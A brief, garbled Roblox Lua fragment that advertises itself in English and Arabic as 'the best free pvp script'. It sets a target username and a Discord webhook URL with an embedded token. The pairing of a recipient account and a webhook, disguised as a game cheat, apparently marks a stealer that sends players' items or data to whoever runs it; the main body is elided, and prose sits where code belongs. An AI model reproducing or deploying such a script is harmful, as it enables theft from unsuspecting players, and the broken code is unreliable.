-- Mode: CUSTOM
getgenv().TARGET_USERNAME = "g_ojo444"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1551406835955662899/5vL8cCH0M1pbKjjzen3Va6HQQPJy7kGuR7VkKcof3hEo0s-b_M4sSYzxCQB0GR_JWEvu"
...
task.spawn(function()
    the best free pvp script #1 wait for the first time
    إنتظر عند الإستخدام لأول مرة pvp السكربت المجاني الأفضل لل
end)